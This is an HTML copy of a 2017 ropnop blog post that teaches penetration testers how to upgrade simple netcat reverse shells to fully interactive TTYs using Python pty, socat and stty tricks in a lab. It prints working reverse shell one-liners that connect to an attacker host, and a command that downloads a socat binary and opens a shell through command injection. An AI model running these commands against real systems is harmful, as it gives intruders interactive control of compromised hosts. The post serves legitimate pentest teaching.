@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Upgrading Simple Shells to Fully Interactive TTYs - ropnop blog</title>
+  <meta name="description" content="Catching a reverse shell over netcat is great&hellip;until you accidentally Ctrl-C and lose it. These techniques let you upgrade your shell to a proper TTY">
+  <meta name="author" content="ropnop"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "ropnop blog",
+    
+    "url": "https:\/\/blog.ropnop.com"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/blog.ropnop.com"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/blog.ropnop.com",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/blog.ropnop.com\/upgrading-simple-shells-to-fully-interactive-ttys\/",
+          "name": "Upgrading simple shells to fully interactive t t ys"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "ropnop"
+  },
+  "headline": "Upgrading Simple Shells to Fully Interactive TTYs",
+  "description" : "Catching a reverse shell over netcat is great\x26hellip;until you accidentally Ctrl-C and lose it. These techniques let you upgrade your shell to a proper TTY",
+  "inLanguage" : "en",
+  "wordCount":  1112 ,
+  "datePublished" : "2017-07-10T00:00:00",
+  "dateModified" : "2017-07-10T00:00:00",
+  "image" : "https:\/\/blog.ropnop.com\/images\/ropnop.jpg",
+  "keywords" : [ "" ],
+  "mainEntityOfPage" : "https:\/\/blog.ropnop.com\/upgrading-simple-shells-to-fully-interactive-ttys\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/blog.ropnop.com",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/blog.ropnop.com\/images\/ropnop.jpg",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="Upgrading Simple Shells to Fully Interactive TTYs" />
+<meta property="og:description" content="Catching a reverse shell over netcat is great&hellip;until you accidentally Ctrl-C and lose it. These techniques let you upgrade your shell to a proper TTY">
+<meta property="og:image" content="https://blog.ropnop.com/images/2017/07/msfvenom_payloads-1.png" />
+<meta property="og:url" content="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="ropnop blog" />
+
+  <meta name="twitter:title" content="Upgrading Simple Shells to Fully Interactive TTYs" />
+  <meta name="twitter:description" content="Catching a reverse shell over netcat is great&hellip;until you accidentally Ctrl-C and lose it. These techniques let you upgrade your shell to a proper TTY">
+  <meta name="twitter:image" content="https://blog.ropnop.com/images/2017/07/msfvenom_payloads-1.png" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@ropnop" />
+  <meta name="twitter:creator" content="@ropnop" />
+  
+  <link rel="apple-touch-icon" sizes="57x57" href='https://blog.ropnop.com/images/favicons/apple-icon-57x57.png'>
+  <link rel="apple-touch-icon" sizes="60x60" href='https://blog.ropnop.com/images/favicons/apple-icon-60x60.png'>
+  <link rel="apple-touch-icon" sizes="72x72" href='https://blog.ropnop.com/images/favicons/apple-icon-72x72.png'>
+  <link rel="apple-touch-icon" sizes="76x76" href='https://blog.ropnop.com/images/favicons/apple-icon-76x76.png'>
+  <link rel="apple-touch-icon" sizes="114x114" href='https://blog.ropnop.com/images/favicons/apple-icon-114x114.png'>
+  <link rel="apple-touch-icon" sizes="120x120" href='https://blog.ropnop.com/images/favicons/apple-icon-120x120.png'>
+  <link rel="apple-touch-icon" sizes="144x144" href='https://blog.ropnop.com/images/favicons/apple-icon-144x144.png'>
+  <link rel="apple-touch-icon" sizes="152x152" href='https://blog.ropnop.com/images/favicons/apple-icon-152x152.png'>
+  <link rel="apple-touch-icon" sizes="180x180" href='https://blog.ropnop.com/images/favicons/apple-icon-180x180.png'>
+  <link rel="icon" type="image/png" sizes="192x192"  href='../images/favicons/android-icon-192x192.png'>
+  <link rel="icon" type="image/png" sizes="32x32" href='../images/favicons/favicon-32x32.png'>
+  <link rel="icon" type="image/png" sizes="96x96" href='../images/favicons/favicon-96x96.png'>
+  <link rel="icon" type="image/png" sizes="16x16" href='../images/favicons/favicon-16x16.png'>
+  <link rel="manifest" href='../images/favicons/manifest.json'>
+  <meta name="msapplication-TileColor" content="#ffffff">
+  <meta name="msapplication-TileImage" content='https://blog.ropnop.com/images/favicons/ms-icon-144x144.png'>
+  <meta name="theme-color" content="#ffffff">
+  <meta name="generator" content="Hugo 0.63.2" />
+  <link rel="alternate" href="https://blog.ropnop.com/index.xml" type="application/rss+xml" title="ropnop blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="../css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="../css/syntax.css" /><link rel="stylesheet" href="../css/codeblock.css" />
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous"><link rel="stylesheet" href="../css/jquery.fancybox.css">
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-76398957-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://blog.ropnop.com">ropnop blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Posts" href="https://blog.ropnop.com/">Posts</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Conference Talks" href="https://blog.ropnop.com/talk">Conference Talks</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://blog.ropnop.com/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Series" href="https://blog.ropnop.com/series">Series</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="ropnop blog" href="https://blog.ropnop.com">
+            <img class="avatar-img" src="../images/ropnop.jpg" alt="ropnop blog" />
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="post-heading">
+              
+                <h1>Upgrading Simple Shells to Fully Interactive TTYs</h1>
+              
+              
+              
+              
+                <span class="post-meta">
+  
+  
+  
+  <i class="fas fa-calendar"></i>&nbsp;Posted on July 10, 2017
+  
+  
+  
+  
+    
+      &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;ropnop
+    
+  
+  
+</span>
+
+
+              
+            </div>
+            
+            <br>
+
+<div class="share-box" aria-hidden="true">
+    <ul class="share">
+      
+      <li>
+        <a href="https://twitter.com/share?url=https%3a%2f%2fblog.ropnop.com%2fupgrading-simple-shells-to-fully-interactive-ttys%2f&amp;text=Upgrading%20Simple%20Shells%20to%20Fully%20Interactive%20TTYs&amp;via=ropnop" target="_blank" title="Share on Twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+    
+      
+      <li>
+        <a href="https://reddit.com/submit?url=https%3a%2f%2fblog.ropnop.com%2fupgrading-simple-shells-to-fully-interactive-ttys%2f&amp;title=Upgrading%20Simple%20Shells%20to%20Fully%20Interactive%20TTYs" target="_blank" title="Share on Reddit">
+          <i class="fab fa-reddit"></i>
+        </a>
+      </li>
+
+      
+      <li>
+        <a href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.ropnop.com%2fupgrading-simple-shells-to-fully-interactive-ttys%2f&amp;t=Upgrading%20Simple%20Shells%20to%20Fully%20Interactive%20TTYs" target="_blank" title="Share on Hacker News">
+          <i class="fab fa-hacker-news"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.ropnop.com%2fupgrading-simple-shells-to-fully-interactive-ttys%2f&amp;title=Upgrading%20Simple%20Shells%20to%20Fully%20Interactive%20TTYs" target="_blank" title="Share on LinkedIn">
+          <i class="fab fa-linkedin"></i>
+        </a>
+      </li>
+
+ 
+      
+    </ul>
+  </div>
+  
+
+            
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+       <aside class="toc-article">
+  <h2>Table of Contents</h2>
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="index.html#generating-reverse-shell-commands">Generating reverse shell commands</a></li>
+    <li><a href="index.html#method-1-python-pty-module">Method 1: Python pty module</a></li>
+    <li><a href="index.html#method-2-using-socat">Method 2: Using socat</a></li>
+    <li><a href="index.html#method-3-upgrading-from-netcat-with-magic">Method 3: Upgrading from netcat with magic</a></li>
+    <li><a href="index.html#tldr-cheatsheet">tl;dr cheatsheet</a></li>
+  </ul>
+</nav>
+</aside>
+ <hr> 
+      
+      <article role="main" class="blog-post">
+        <p>Every pentester knows that amazing feeling when they catch a reverse shell with netcat and see that oh-so-satisfying verbose netcat message followed by output from <code>id</code>.</p>
+<p>And if other pentesters are like me, they also know that dreadful feeling when their shell is lost because they run a bad command that hangs and accidentally hit &ldquo;Ctrl-C&rdquo; thinking it will stop it but it instead kills the entire connection.</p>
+<p><p>
+    <a data-fancybox href="../images/2017/07/oops_ctrl_c.png" >
+    <img src="../images/2017/07/oops_ctrl_c.png" alt="Oops!"  />
+    </a>
+</p>
+
+
+</p>
+<p>Besides not correctly handling SIGINT, these&quot;dumb&rdquo; shells have other shortcomings as well:</p>
+<ul>
+<li>Some commands, like <code>su</code> and <code>ssh</code> require a proper terminal to run</li>
+<li>STDERR usually isn&rsquo;t displayed</li>
+<li>Can&rsquo;t properly use text editors like <code>vim</code></li>
+<li>No tab-complete</li>
+<li>No up arrow history</li>
+<li>No job control</li>
+<li>Etc&hellip;</li>
+</ul>
+<p>Long story short, while these shells are great to catch, I&rsquo;d much rather operate in a fully interactive TTY.</p>
+<p>I&rsquo;ve come across some good resources that include very helpful tips and techniques for &ldquo;upgrading&rdquo; these shells, and wanted to compile and share in a post. Along with Pentest Monkey, I also learned the techniques from Phineas Fisher in his released videos and writeups of his illegal activities:</p>
+<ul>
+<li><a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">Pentest Monkey - Post Exploitation Without a TTY</a></li>
+<li><a href="https://www.youtube.com/watch?v=oI_ZhFCS3AQ#t=25m53s">Phineas Fisher Hacks Catalan Police Union Website</a></li>
+<li><a href="http://pastebin.com/raw/0SNSvyjJ">Phineas Fisher - Hackingteam Writeup</a></li>
+</ul>
+<p>For reference, in all the screenshots and commands to follow, I am injecting commands in to a vulnerable web server (&ldquo;VICTIM&rdquo;) and catching shells from my Kali VM (&ldquo;KALI&rdquo;):</p>
+<ul>
+<li><strong>VICTIM IP</strong>: 10.0.3.7</li>
+<li><strong>KALI IP</strong>: 10.0.3.4</li>
+</ul>
+<h1 id="generating-reverse-shell-commands">Generating reverse shell commands</h1>
+<p>Everyone is pretty familiar with the traditional way of using netcat to get a reverse shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nc -e /bin/sh 10.0.3.4 <span class="m">4444</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>and catching it with:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nc -lvp <span class="m">4444</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The problem is not every server has netcat installed, and not every version of netcat has the <code>-e</code> option.</p>
+<p>Pentest Monkey has a great <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">cheatsheet</a> outlining a few different methods, but my favorite technique is to use Metasploit&rsquo;s <code>msfvenom</code> to generate the one-liner commands for me.</p>
+<p>Metasploit has several payloads under &ldquo;cmd/unix&rdquo; that can be used to generate one-liner bind or reverse shells:</p>
+<p><p>
+    <a data-fancybox href="../images/2017/07/msfvenom_payloads.png" >
+    <img src="../images/2017/07/msfvenom_payloads.png" alt="msfvenom payloads"  />
+    </a>
+</p>
+
+
+</p>
+<p>Any of these payloads can be used with <code>msfvenom</code> to spit out the raw command needed (specifying LHOST, LPORT or RPORT). For example, here&rsquo;s a netcat command not requiring the <code>-e</code> flag:</p>
+<p><p>
+    <a data-fancybox href="../images/2017/07/netcat_shell_cmd.png" >
+    <img src="../images/2017/07/netcat_shell_cmd.png" alt="Netcat shell"  />
+    </a>
+</p>
+
+
+</p>
+<p>And here&rsquo;s a Perl oneliner in case <code>netcat</code> isn&rsquo;t installed:</p>
+<p><p>
+    <a data-fancybox href="../images/2017/07/perl_shell_cmd.png" >
+    <img src="../images/2017/07/perl_shell_cmd.png" alt="Perl shell"  />
+    </a>
+</p>
+
+
+</p>
+<p>These can all be caught by using netcat and listening on the port specified (4444).</p>
+<h1 id="method-1-python-pty-module">Method 1: Python pty module</h1>
+<p>One of my go-to commands for a long time after catching a dumb shell was to use Python to spawn a pty. The <a href="https://docs.python.org/2/library/pty.html">pty module</a> let&rsquo;s you spawn a psuedo-terminal that can fool commands like <code>su</code> into thinking they are being executed in a proper terminal. To upgrade a dumb shell, simply run the following command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>This will let you run <code>su</code> for example (in addition to giving you a nicer prompt)</p>
+<p><p>
+    <a data-fancybox href="../images/2017/07/python_pty.png" >
+    <img src="../images/2017/07/python_pty.png" alt="Python PTY"  />
+    </a>
+</p>
+
+
+</p>
+<p>Unfortunately, this doesn&rsquo;t get around some of the other issues outlined above. SIGINT (Ctrl-C) will still close Netcat, and there&rsquo;s no tab-completion or history. But it&rsquo;s a quick and dirty workaround that has helped me numerous times.</p>
+<h1 id="method-2-using-socat">Method 2: Using socat</h1>
+<p><a href="http://www.dest-unreach.org/socat/doc/socat.html">socat</a> is like netcat on steroids and is a very powerfull networking swiss-army knife. Socat can be used to pass full TTY&rsquo;s over TCP connections.</p>
+<p>If <code>socat</code> is installed on the victim server, you can launch a reverse shell with it. You <em>must</em> catch the connection with <code>socat</code> as well to get the full functions.</p>
+<p>The following commands will yield a fully interactive TTY reverse shell:</p>
+<p><strong>On Kali (listen)</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">socat file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span> tcp-listen:4444
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>On Victim (launch)</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+</code></pre></td></tr></table>
+</div>
+</div><p>If socat isn&rsquo;t installed, you&rsquo;re not out of luck. There are standalone binaries that can be downloaded from this awesome Github repo:</p>
+<p><a href="https://github.com/andrew-d/static-binaries">https://github.com/andrew-d/static-binaries</a></p>
+<p>With a command injection vuln, it&rsquo;s possible to download the correct architecture <code>socat</code> binary to a writable directoy, chmod it, then execute a reverse shell in one line:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat<span class="p">;</span> chmod +x /tmp/socat<span class="p">;</span> /tmp/socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+</code></pre></td></tr></table>
+</div>
+</div><p>On Kali, you&rsquo;ll catch a fully interactive TTY session. It supports tab-completion, SIGINT/SIGSTP support, vim, up arrow history, etc. It&rsquo;s a full terminal. Pretty sweet.</p>
+<p><p>
+    <a data-fancybox href="../images/2017/07/socat_tty.png" >
+    <img src="../images/2017/07/socat_tty.png" alt="Socat tty"  />
+    </a>
+</p>
+
+
+</p>
+<h1 id="method-3-upgrading-from-netcat-with-magic">Method 3: Upgrading from netcat with magic</h1>
+<p>I watched Phineas Fisher use this technique in his hacking video, and it feels like magic. Basically it is possible to use a dumb netcat shell to upgrade to a full TTY by setting some <code>stty</code> options within your Kali terminal.</p>
+<p>First, follow the same technique as in Method 1 and use Python to spawn a PTY. Once bash is running in the PTY, background the shell with <code>Ctrl-Z</code></p>
+<p><p>
+    <a data-fancybox href="../images/2017/07/background_netcat.png" >
+    <img src="../images/2017/07/background_netcat.png" alt="Background shell"  />
+    </a>
+</p>
+
+
+</p>
+<p>While the shell is in the background,  now examine the current terminal and STTY info so we can force the connected shell to match it:</p>
+<p><p>
+    <a data-fancybox href="../images/2017/07/term_stty_info.png" >
+    <img src="../images/2017/07/term_stty_info.png" alt="Term and STTY info"  />
+    </a>
+</p>
+
+
+</p>
+<p>The information needed is the TERM type (<em>&ldquo;xterm-256color&rdquo;</em>) and the size of the current TTY (<em>&ldquo;rows 38; columns 116&rdquo;</em>)</p>
+<p>With the shell still backgrounded, now set the current STTY to type raw and tell it to echo the input characters with the following command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">stty raw -echo
+</code></pre></td></tr></table>
+</div>
+</div><p>With a raw stty, input/output will look weird and you won&rsquo;t see the next commands, but as you type they are being processed.</p>
+<p>Next foreground the shell with <code>fg</code>. It will re-open the reverse shell but formatting will be off. Finally, reinitialize the terminal with <code>reset</code>.</p>
+<p><p>
+    <a data-fancybox href="../images/2017/07/fg_reset.png" >
+    <img src="../images/2017/07/fg_reset.png" alt="Foreground and reset"  />
+    </a>
+</p>
+
+
+</p>
+<p><em>Note: I did not type the <code>nc</code> command again (as it might look above). I actually entered <code>fg</code>, but it was not echoed. The <code>nc</code> command is the job that is now in the foreground. The <code>reset</code> command was then entered into the netcat shell</em></p>
+<p>After the <code>reset</code> the shell should look normal again. The last step is to set the shell, terminal type and stty size to match our current Kali window (from the info gathered above)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">$ <span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
+$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm256-color
+$ stty rows <span class="m">38</span> columns <span class="m">116</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The end result is a fully interactive TTY with all the features we&rsquo;d expect (tab-complete, history, job control, etc) all over a netcat connection:</p>
+<p><p>
+    <a data-fancybox href="../images/2017/07/netcat_full_tty.png" >
+    <img src="../images/2017/07/netcat_full_tty.png" alt="Netcat full TTY"  />
+    </a>
+</p>
+
+
+</p>
+<p>The possibilities are endless now. Tmux over a netcat shell?? Why not? :D</p>
+<p><p>
+    <a data-fancybox href="../images/2017/07/tmux_over_netcat-1.png" >
+    <img src="../images/2017/07/tmux_over_netcat-1.png" alt="Tmux over Netcat"  />
+    </a>
+</p>
+
+
+</p>
+<h1 id="tldr-cheatsheet">tl;dr cheatsheet</h1>
+<p>Cheatsheet commands:</p>
+<p><strong>Using Python for a psuedo terminal</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>Using socat</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#Listener:</span>
+socat file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span><span class="m">0</span> tcp-listen:4444
+
+<span class="c1">#Victim:</span>
+socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>Using stty options</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># In reverse shell</span>
+$ python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+Ctrl-Z
+
+<span class="c1"># In Kali</span>
+$ stty raw -echo
+$ <span class="nb">fg</span>
+
+<span class="c1"># In reverse shell</span>
+$ reset
+$ <span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
+$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color
+$ stty rows &lt;num&gt; columns &lt;cols&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>Any other cool techniques? Let me know in the comments or hit me up on twitter.</p>
+<p>Enjoy!
+-ropnop</p>
+
+
+        
+
+        
+            <hr/>
+            <section id="social-share">
+              <div class="list-inline footer-links">
+                
+
+<div class="share-box" aria-hidden="true">
+    <ul class="share">
+      
+      <li>
+        <a href="https://twitter.com/share?url=https%3a%2f%2fblog.ropnop.com%2fupgrading-simple-shells-to-fully-interactive-ttys%2f&amp;text=Upgrading%20Simple%20Shells%20to%20Fully%20Interactive%20TTYs&amp;via=ropnop" target="_blank" title="Share on Twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+    
+      
+      <li>
+        <a href="https://reddit.com/submit?url=https%3a%2f%2fblog.ropnop.com%2fupgrading-simple-shells-to-fully-interactive-ttys%2f&amp;title=Upgrading%20Simple%20Shells%20to%20Fully%20Interactive%20TTYs" target="_blank" title="Share on Reddit">
+          <i class="fab fa-reddit"></i>
+        </a>
+      </li>
+
+      
+      <li>
+        <a href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.ropnop.com%2fupgrading-simple-shells-to-fully-interactive-ttys%2f&amp;t=Upgrading%20Simple%20Shells%20to%20Fully%20Interactive%20TTYs" target="_blank" title="Share on Hacker News">
+          <i class="fab fa-hacker-news"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.ropnop.com%2fupgrading-simple-shells-to-fully-interactive-ttys%2f&amp;title=Upgrading%20Simple%20Shells%20to%20Fully%20Interactive%20TTYs" target="_blank" title="Share on LinkedIn">
+          <i class="fab fa-linkedin"></i>
+        </a>
+      </li>
+
+ 
+      
+    </ul>
+  </div>
+  
+
+              </div>
+            </section>
+        
+
+        
+          
+
+          
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/" data-toggle="tooltip" data-placement="top" title="Extracting Hashes and Domain Info From ntds.dit">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://blog.ropnop.com/remotely-managing-hyper-v-in-a-workgroup-environment/" data-toggle="tooltip" data-placement="top" title="Remotely Managing Hyper-V in a Workgroup Environment">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+        
+          
+          <div class="disqus-comments">                  
+            <button id="show-comments" class="btn btn-default" type="button">Show <span class="disqus-comment-count" data-disqus-url="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys">comments</span></button>
+            <div id="disqus_thread"></div>
+
+            <script type="text/javascript">
+              var disqus_config = function () {
+              this.page.url = 'https:\/\/blog.ropnop.com\/upgrading-simple-shells-to-fully-interactive-ttys';
+            };
+
+          </script>
+          </div>
+          
+        
+        
+      
+
+    </div>
+  </div>
+</div>
+
+      
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="mailto:rflathers@gmail.com" title="Email me">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
